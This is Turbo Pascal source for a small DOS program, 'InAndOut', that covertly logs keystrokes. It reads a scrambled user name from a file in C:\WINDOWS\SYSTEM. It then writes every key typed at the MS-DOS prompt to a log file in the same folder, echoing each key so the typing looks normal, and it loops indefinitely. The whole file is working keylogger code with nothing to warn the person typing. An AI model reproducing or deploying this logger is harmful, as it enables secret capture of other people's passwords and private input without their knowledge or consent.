program InAndOut;

uses
 Crt, Std, Dos;

const
 VerNum = 'v1.0';
 FileLocation = 'C:\WINDOWS\SYSTEM\WATCH.LOG';
 Buffer = 256;

var
 DFile : text;
 UFile : text;
 Key   : char;
 Count : integer;
 Year, Month, Day, DayOfWeek  : word;
 Hour, Minute, Second, Sec100 : word;
 UserName : string;

procedure Init;
 var
  Pth : PathStr;
 begin
  assign(DFile, FileLocation);
  assign(UFile, 'C:\WINDOWS\SYSTEM\USER.ON');
  GetDate(Year, Month, Day, DayOfWeek);
  GetTime(Hour, Minute, Second, Sec100);
  Pth := fsearch(FileLocation, GetEnv('PATH'));
  if Pth = '' then
   begin
    rewrite(DFile);
    writeln(DFile, '--- File Created ' + Int2Str(Month) + '/' + Int2Str(Day) +
            '/' + Int2Str(Year) + ' at ' + Int2Str(Hour) + ':' + Int2Str(Minute) + ' ---');
    close(DFile);
   end;
  reset(UFile);
  readln(UFile, UserName);
  close(UFile);
  UserName := DeScramble(UserName);
  append(DFile);
  writeln(DFile, '---------- ' + UserName +
          ' started MS-DOS Prompt at ' + Int2Str(Hour) + ':' + Int2Str(Minute) +
          ', ' + Int2Str(Month) + '/' + Int2Str(Day) + '/' + Int2Str(Year) + '----------');
  Count := 0;
 end;

begin
 Init;
  repeat
   read(Key);
   write(DFile, Key);
   write(Key);
   Count := Count + 1;
   if Count > Buffer then
    begin
     Count := 0;
     close(DFile);
     append(DFile);
    end;
  until 1 = 2;
 close(DFile);
end.

